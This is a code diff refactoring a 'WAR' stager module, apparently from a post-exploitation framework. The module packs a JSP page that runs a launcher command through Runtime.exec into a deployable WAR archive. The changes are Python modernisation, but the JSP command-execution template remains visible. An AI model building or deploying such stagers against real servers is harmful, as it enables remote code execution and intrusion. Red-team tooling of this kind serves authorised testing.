@@ -1,15 +1,12 @@
-from __future__ import print_function
-
 import io
 import logging
 import zipfile
-from builtins import object, str
 
 log = logging.getLogger(__name__)
 
 
-class Stager(object):
-    def __init__(self, mainMenu, params=[]):
+class Stager:
+    def __init__(self, mainMenu):
         self.info = {
             "Name": "WAR",
             "Authors": [
@@ -79,7 +76,7 @@ class Stager(object):
                 "Value": "default",
             },
             "ProxyCreds": {
-                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
+                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                 "Required": False,
                 "Value": "default",
             },
@@ -88,12 +85,6 @@ class Stager(object):
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]["Value"] = value
 
     def generate(self):
         # extract all of our options
@@ -159,7 +150,7 @@ class Stager(object):
             # Create initial JSP and Web XML Strings with placeholders
             jsp_code = (
                 '''<%@ page import="java.io.*" %>
-<% 
+<%
 Process p=Runtime.getRuntime().exec("'''
                 + str(launcher)
                 + """");
@@ -168,20 +159,17 @@ Process p=Runtime.getRuntime().exec("'''
             )
 
             # .xml deployment config
-            wxml_code = """<?xml version="1.0"?>
-<!DOCTYPE web-app PUBLIC 
-"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" 
+            wxml_code = f"""<?xml version="1.0"?>
+<!DOCTYPE web-app PUBLIC
+"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd">
 <web-app>
 <servlet>
-<servlet-name>%s</servlet-name>
-<jsp-file>/%s.jsp</jsp-file>
+<servlet-name>{app_name}</servlet-name>
+<jsp-file>/{app_name}.jsp</jsp-file>
 </servlet>
 </web-app>
-""" % (
-                app_name,
-                app_name,
-            )
+"""
 
             # build the in-memory ZIP and write the three files in
             war_file = io.BytesIO()
